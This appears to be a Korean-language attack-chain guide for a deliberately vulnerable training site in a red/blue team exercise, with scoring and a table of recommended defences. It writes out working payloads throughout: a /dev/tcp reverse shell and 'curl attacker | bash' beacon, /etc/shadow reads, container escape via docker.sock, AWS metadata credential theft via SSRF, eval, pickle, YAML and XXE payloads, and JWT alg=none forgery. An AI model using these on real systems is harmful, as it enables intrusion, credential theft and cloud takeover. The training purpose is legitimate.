# AdminConsole — HARD mode 5 Chain (P13 Phase 3)

> **HARD 모드**: DevOps 관리자 패널 — RCE 5종 + SSRF + cmd inject chain.
> 5 chain 모두 RCE 또는 RCE-equivalent 종착 — 가장 위험. 점수 +340.

## 강조 차별점 (vs Normal)
- **RCE 다양성**: cmd inject / eval / pickle / yaml / .py upload / SSTI 5개 RCE 경로
- **SSRF → RCE chain**: cloud metadata → IAM credentials → 외부 호출
- **수평 escalation**: weak reset → admin → secrets dump → AWS key → cloud takeover
- **영속성**: webshell + crontab + git pull backdoor

---

## Chain 1: cmd inject → reverse shell → 컨테이너 탈출 (Cmd → Shell → Escape)
**점수 +80** · **MITRE T1059.004 + T1611**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 1.1 | ping tool 에 cmd inject — `; bash -i >& /dev/tcp/attacker/4444 0>&1` | `POST /tools tool=ping target=127.0.0.1; <RCE>` | V01 cmd inject | reverse shell |
| 1.2 | shell 안에서 컨테이너 탈출 — docker.sock 접근 시 | `ls /var/run/docker.sock; docker run -v /:/host alpine` | V01 + container misconfig | host 접근 |
| 1.3 | dig 또는 whois 로 추가 cmd inject 시도 (BLUE 가 ping 차단 시) | tool=dig target=`example.com; cat /etc/shadow` | V02 / V03 cmd inject | shadow 내용 |
| 1.4 | git_clone 으로 git option injection — `--upload-pack=...` | tool=git_clone target=`--upload-pack=touch /tmp/pwn https://...` | V06 git option inject | /tmp/pwn 생성 |

**완주 시**: 호스트 시스템 RCE + 영구 컨테이너 탈출. BLUE 가 ping/dig/whois 차단 (shlex.quote) 해도 V06 git_clone 으로 진행.

---

## Chain 2: SSRF → cloud metadata → IAM credentials (Cloud Takeover)
**점수 +70** · **MITRE T1552.005 + T1078.004**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 2.1 | webhook test 로 AWS metadata 조회 | `GET /api/webhook/test?url=http://169.254.169.254/latest/meta-data/` | V05 SSRF | metadata list |
| 2.2 | IAM role credentials 추출 | `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | V05 SSRF | AccessKeyId + SecretAccessKey |
| 2.3 | fetch tool 로 file:// LFI (metadata 차단 시 fallback) | tool=fetch target=`file:///etc/passwd` | V04 SSRF file:// | passwd 내용 |
| 2.4 | files/read 로 .aws/credentials 직접 읽기 | `GET /files/read?path=/root/.aws/credentials` | V09 path traversal | aws credentials |
| 2.5 | 추출된 AWS key 로 외부에서 S3 dump / EC2 launch | (out-of-band) `aws s3 ls --profile stolen` | post-exploitation | bucket 노출 |

**완주 시**: AWS account 인수 + 모든 S3/EC2 통제. BLUE 가 SSRF allowlist 적용해도 V09 path traversal 단독으로 .aws/credentials 추출.

---

## Chain 3: weak reset → admin → secrets dump → exec_python (Reset → Admin → Code)
**점수 +80** · **MITRE T1098.001 + T1552.001**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 3.1 | email enumeration — admin@ac.local 존재 확인 | `POST /forgot email=admin@ac.local` | V12 enumeration | 정상 응답 |
| 3.2 | reset token 예측 (`md5(email + YYYYMMDD)[:12]`) → password 변경 | `POST /reset?token=<predicted>` new_pw=pwned | V11 weak token | password 변경 |
| 3.3 | admin/pwned 로 로그인 → 모든 secrets IDOR | `GET /api/secrets/1` (AWS) `/2` (DB) `/3` (SSH) `/4` (git) | V14 + V16 IDOR | secrets dump |
| 3.4 | calc tool eval 로 OS-level RCE | `POST /tools tool=calc target=__import__('os').popen('id').read()` | V07 eval RCE | uid output |
| 3.5 | exec_python tool 인증 0 — 직접 RCE | `POST /api/tool/exec_python {"code":"...reverse shell..."}` | V09 exec_python | code exec |

**완주 시**: admin 인수 + 모든 secrets + RCE. BLUE 가 reset token 강화해도 V14 default admin/admin 으로 진행 가능.

---

## Chain 4: pickle / yaml unsafe load → 영구 백도어 (Deserialization → Persistence)
**점수 +60** · **MITRE T1190 + T1546.004**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 4.1 | pickle 페이로드 생성 — `os.system('curl attacker | bash')` | (local) python | V08 pickle | payload bytes |
| 4.2 | jobs/import 로 pickle 전달 → RCE | `POST /api/jobs/import` raw pickle | V08 deserial | exec |
| 4.3 | yaml.unsafe_load 대안 — `!!python/object/apply:os.system ['id']` | `POST /api/jobs/import.yaml` | V17 yaml | exec |
| 4.4 | XXE 로 file disclosure (pickle/yaml 둘 다 차단 시) | `POST /api/import.xml` `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>` | V25 XXE | passwd |
| 4.5 | crontab 으로 영속성 — `* * * * * curl attacker/beacon` | (RCE) `echo "* * * * * ..." | crontab -` | post-exploit | beacon 시작 |

**완주 시**: 영구 RCE + 자동 beacon. BLUE 가 pickle/yaml 차단해도 V25 XXE 로 진행.

---

## Chain 5: .py upload → JWT alg=none → admin token → console (Upload → Auth → Backdoor)
**점수 +50** · **MITRE T1505.003 + T1556.004**

| Step | 동작 | endpoint | 사용 vuln | 검증 |
|------|------|----------|-----------|------|
| 5.1 | .py 또는 .sh 파일 업로드 — RCE gadget | `POST /upload file=evil.py` | V24 file upload 0 검증 | path 응답 |
| 5.2 | 업로드된 file 을 cron 또는 git hook 으로 실행 (RCE 후 chain) | (RCE) `python /app/uploads/evil.py` | V24 + post-exploit | code exec |
| 5.3 | JWT alg=none 으로 admin 위조 (RCE 차단된 경우) | `Authorization: Bearer eyJhbGciOiJub25lIn0...` | V15 JWT none | 200 응답 |
| 5.4 | api/console 에 token URL query 로 전달 → 콘솔 권한 | `GET /api/console?token=<api_token>` | V28 token in URL | console:granted |
| 5.5 | open redirect 로 SSO bypass + phishing chain | `GET /sso/return?next=//attacker/fake-login` | V27 open redirect | redirect |

**완주 시**: 영구 console 권한 + phishing 추가 진입 경로. BLUE 가 .py 차단해도 V15 JWT none 으로 admin 권한 획득.

---

## BLUE 권장 차단 (Hard 모드)

| 차단 영역 | 우선순위 | 도구 |
|-----------|----------|------|
| cmd 도구 — shlex.quote + allowlist target only | **CRITICAL** | shlex + ipaddress.ip_address validate |
| eval 제거 — calc 은 ast.literal_eval 또는 simpleeval | **CRITICAL** | simpleeval library |
| pickle.loads → JSON 또는 protobuf | **CRITICAL** | json.loads only |
| yaml.unsafe_load → yaml.safe_load | **CRITICAL** | safe_load |
| XXE 차단 — defusedxml.ElementTree | **CRITICAL** | defusedxml |
| 파일 업로드 — extension allowlist + magic bytes + uploads/ no-exec | **CRITICAL** | python-magic + chmod 644 + nginx no-exec |
| SSRF egress allowlist + DNS rebinding 차단 | High | iptables OUTPUT + dnsmasq |
| JWT alg=RS256 only + 강한 secret + iat/exp 검증 | High | PyJWT verify_signature |
| reset token — secrets.token_urlsafe(32) + 1h 만료 | High | secrets module |
| default admin/admin 변경 + bcrypt + 5회 lockout | High | passlib + Flask-Limiter |
| API token in header only (URL query 금지) | Med | FastAPI Depends Header |
| open redirect — host whitelist | Med | url_has_allowed_host_and_scheme |

---

## 점수 가중

| chain | 단순 step 합 | chain 완주 보너스 | 총 |
|-------|-------------|-------------------|-----|
| Chain 1 cmd RCE | +40 | +40 | **+80** |
| Chain 2 SSRF cloud | +35 | +35 | **+70** |
| Chain 3 reset → exec | +40 | +40 | **+80** |
| Chain 4 pickle/yaml | +30 | +30 | **+60** |
| Chain 5 upload/JWT | +25 | +25 | **+50** |
| **합** | **+170** | **+170** | **+340** |

5 chain 완주 시 +340 점 (Normal +160 의 2.1배 — DevOps RCE 의 비즈니스 임팩트 반영).

---

## 운영자 점검

```bash
bash contents/vuln-sites/up.sh up   # adminconsole :3004
# Battle admin UI: site=adminconsole + difficulty=hard
# ⚠️ RCE 5종 — 격리 네트워크 절대 외부 노출 금지
```
